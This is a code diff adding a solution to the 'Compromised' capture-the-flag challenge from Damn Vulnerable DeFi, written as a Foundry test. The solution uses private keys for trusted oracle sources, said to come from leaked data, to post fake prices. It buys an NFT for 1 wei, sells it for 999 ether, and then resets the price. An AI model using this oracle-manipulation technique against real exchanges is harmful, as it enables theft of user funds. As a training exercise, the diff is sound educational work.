@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {VmSafe} from "forge-std/Vm.sol";
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
@@ -11,6 +12,8 @@ import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
 contract CompromisedChallenge is Test {
+    using Address for address payable;
+
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
@@ -75,7 +78,43 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Manipiulate the price to 1 wei
+        _maniupulatePrice(1 wei);
+
+        // But NFT for 1 wei (cheap yeah)
+         vm.prank(player);
+         exchange.buyOne{value: 1 wei}();
+
+        // Manipiulate the price to 999 ether + 1 wei
+        _maniupulatePrice(999 ether + 1 wei);
+
+        vm.startPrank(player);
+        // Approve the exchange to transfer the NFT
+        nft.approve(address(exchange), 0);
+
+        // Sell the NFT for 999 ETH
+        exchange.sellOne(0);
+
+        // Send the ETH to the recovery address
+        payable(address(recovery)).sendValue(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        // Maniupulate the price to 999 ether
+        _maniupulatePrice(999 ether);
+    }
+
+    function _maniupulatePrice(uint256 price) internal {
+        // Derive private keys for the trusted sources from leaked data
+         address source1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+         address source2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        // Update price of DVNFT by the first source
+         vm.prank(source1);
+         oracle.postPrice("DVNFT", price);
+
+        // Update price of DVNFT by the second source
+         vm.prank(source2);
+         oracle.postPrice("DVNFT", price);
     }
 
     /**
